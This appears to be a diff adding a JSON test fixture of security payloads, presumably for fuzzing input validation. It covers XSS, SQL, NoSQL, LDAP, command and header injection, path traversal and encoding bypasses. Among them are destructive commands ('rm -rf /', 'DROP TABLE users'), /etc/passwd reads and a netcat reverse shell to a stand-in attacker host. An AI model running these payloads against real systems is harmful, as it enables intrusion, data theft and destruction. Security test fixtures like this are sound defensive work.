@@ -1,0 +1,123 @@
+{
+  "xssPayloads": [
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert('XSS')>",
+    "javascript:alert('XSS')",
+    "<svg onload=alert('XSS')>",
+    "'\"><script>alert('XSS')</script>",
+    "<iframe src=javascript:alert('XSS')>",
+    "<object data=javascript:alert('XSS')>",
+    "<embed src=javascript:alert('XSS')>",
+    "<link rel=stylesheet href=javascript:alert('XSS')>",
+    "<style>body{background:url(javascript:alert('XSS'))}</style>"
+  ],
+  
+  "sqlInjectionPayloads": [
+    "'; DROP TABLE users; --",
+    "' OR '1'='1",
+    "' UNION SELECT * FROM users --",
+    "admin'--",
+    "admin' /*",
+    "' OR 1=1#",
+    "' OR 'a'='a",
+    "') OR ('1'='1",
+    "' WAITFOR DELAY '00:00:05' --",
+    "'; EXEC xp_cmdshell('dir'); --"
+  ],
+  
+  "nosqlInjectionPayloads": [
+    "{\"$ne\": null}",
+    "{\"$gt\": \"\"}",
+    "{\"$regex\": \".*\"}",
+    "{\"$where\": \"function(){return true}\"}",
+    "[$ne]=null",
+    "[$gt]=",
+    "[$exists]=true",
+    "{\"$or\": [{}, {\"a\":\"a\"}]}"
+  ],
+  
+  "ldapInjectionPayloads": [
+    "admin)(|(password=*))",
+    "admin)(&(password=*))",
+    "*)(uid=*",
+    "admin))(|(uid=*",
+    "*)(|(mail=*",
+    "*))%00",
+    "*()|%26'",
+    "*)(objectClass=*"
+  ],
+  
+  "commandInjectionPayloads": [
+    "; rm -rf /",
+    "| cat /etc/passwd",
+    "&& echo vulnerable",
+    "; shutdown -h now",
+    "` whoami `",
+    "$( id )",
+    "${PATH}",
+    "; nc -e /bin/sh attacker.com 4444"
+  ],
+  
+  "pathTraversalPayloads": [
+    "../../../etc/passwd",
+    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "....//....//....//etc/passwd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "..%252f..%252f..%252fetc%252fpasswd",
+    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+    "/var/www/../../etc/passwd",
+    "php://filter/convert.base64-encode/resource=../config.php"
+  ],
+  
+  "headerInjectionPayloads": [
+    "test\nX-Injected-Header: malicious",
+    "test\r\nX-Injected-Header: malicious",
+    "test%0aX-Injected-Header: malicious",
+    "test%0d%0aX-Injected-Header: malicious",
+    "test\n\rX-Injected-Header: malicious",
+    "test%0a%0dX-Injected-Header: malicious"
+  ],
+  
+  "specialCharacters": [
+    "!@#$%^&*()_+-=[]{}|;':\",./<>?",
+    "áéíóúñü",
+    "中文字符",
+    "русский",
+    "العربية",
+    "🎉🔥💯",
+    "null\u0000byte",
+    "unicode\u202eoverride",
+    "tab\tcharacter",
+    "newline\ncharacter"
+  ],
+  
+  "bufferOverflowPayloads": [
+    "REPEAT_A_1000",
+    "REPEAT_A_10000", 
+    "REPEAT_A_100000",
+    "REPEAT_%41_1000",
+    "REPEAT_\\u0041_1000"
+  ],
+  
+  "encodingBypassPayloads": [
+    "%3Cscript%3Ealert('XSS')%3C/script%3E",
+    "&lt;script&gt;alert('XSS')&lt;/script&gt;",
+    "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
+    "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
+    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
+    "&#x3c;script&#x3e;alert('XSS')&#x3c;/script&#x3e;"
+  ],
+  
+  "protocolBypassPayloads": [
+    "javascript://comment%0Aalert(1)",
+    "java\u0000script:alert(1)",
+    "javascript&colon;alert(1)",
+    "javascript&#58;alert(1)",
+    "javascript%3aalert(1)",
+    "data:text/html,<script>alert(1)</script>",
+    "data:application/javascript,alert(1)",
+    "vbscript:msgbox(1)",
+    "livescript:alert(1)",
+    "mocha:alert(1)"
+  ]
+}
